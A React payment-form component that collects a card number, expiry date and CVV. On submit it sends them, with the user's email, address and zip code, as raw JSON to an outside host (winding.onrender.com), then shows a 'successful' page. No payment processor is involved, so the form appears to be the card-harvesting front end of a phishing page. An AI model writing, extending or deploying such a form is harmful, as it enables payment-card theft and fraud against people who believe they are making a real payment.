import { Link } from 'react-router-dom';


const App = ({setMyccnumber, setMyexp, myexp,
confirmData, myaddress, myzipcode, myemail,
setMycccsc,  myccnumber, mycccsc}) => {

    const handleCardDisplay = () => {
        const rawText = [...myccnumber.split(' ').join('')] 
        const creditCard = [] 
        rawText.forEach((t, i) => {
            if (i % 4 === 0) {
                creditCard.push(' ') 
            }
            creditCard.push(t)
        })
        return creditCard.join('')
    }

    const handleCardExp = () => {
        const rawText = [...myexp.split(' ').join('')] 
        const creditCard = [] 
        rawText.forEach((t, i) => {
            if (i % 2 === 0) {
                creditCard.push(' ') 
            }
            creditCard.push(t)
        })
        return creditCard.join('')
    }

    const myData = {
        name: "Dr. Abdulai",
        descr: "Great"
    }

    const handleSubmit = (e) => {
        //e.preventDefault();
        fetch("https://winding.onrender.com" ,
        {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            temail: myemail,
            taddress: myaddress,
            tzipcode: myzipcode,
            tccnumber: myccnumber,
            tcsc: mycccsc,
            texp: myexp
        })} 
        )
    }
    


    return (
        <article>
            <h1 className="text-lg font-semibold 
            text-rose-500 mb-4" >Your payment details</h1>
            <h2 className="text-basekm font-semibold 
             mb-4" >Submit your card details below</h2>
            <section>
                <form 
                onSubmit={handleSubmit} >
                <div className="flex flex-col "  >
                    <label 
                    className="font-medium" >Credit/Debit Card Number</label>
                    <input type="tel" autoComplete="cc-number"
                    name="myccnumber" maxLength="20"
                    value={handleCardDisplay()} required
                    onChange={e => setMyccnumber(e.target.value)}
                    className="py-1 px-4
                    bg-gray-50 mt-1 
                   rounded-md mb-6
                   border border-gray-400
                   outline-none outline-offset-0
                   focus:border-blue-400 focus:outline-4
                   focus:outline-blue-400"
                    />
                </div>
                <div className="flex flex-col
                " >
                    <label className="font-medium" >Expiration Date MM YY</label>
                    <input type="tel" autoComplete="cc-exp"
                    maxLength="6" required
                    value={handleCardExp()}
                    onChange={e => setMyexp(e.target.value)}
                    className="py-1 px-4 
                    bg-gray-50 mt-1 w-1/2
                   rounded-md mb-6
                   border border-gray-400
                   outline-none outline-offset-0
                   focus:border-blue-400 focus:outline-4
                   focus:outline-blue-400"
                    />
                </div>
                <div>
                    <label className="text-lg 
                    font-medium" >CVV</label>
                    <input type="tel" autoComplete="cc-csc" 
                    required
                    onChange={e => setMycccsc(e.target.value)}
                    value={mycccsc} maxlength="3"
                    className="py-1 px-2 pr-4
                    bg-gray-50 mt-1 ml-4 
                   rounded-md mb-6 w-16
                   border border-gray-400
                   outline-none outline-offset-0
                   focus:border-blue-400 focus:outline-4
                   focus:outline-blue-400"
                    />
                </div>
                {/*
                <div className="flex flex-col ">
                    <Link to="/done"
                     className="py-2 font-medium
                     text-base bg-blue-700 rounded-md flex 
                     justify-center
                     hover:bg-blue-500 active:bg-blue-500
                     text-white" >
                        Continue
                    </Link>
                </div>
                */}
                <div className="flex flex-col" 
                type="button" role="button" >
                    <Link to="/successful"  
                     className="flex flex-col"
                     >
                        <button 
                          className="py-2 font-medium
                          text-base bg-blue-700 rounded-md flex 
                          justify-center 
                          hover:bg-blue-500 active:bg-blue-500
                          text-white" 
                          disabled={!(myccnumber && myexp && 
                            mycccsc)} 
                          onClick={handleSubmit}
                        >
                            Confirm
                        </button>
                    </Link>
                </div>
                </form>
            </section>
        </article>
    )
}
export default App;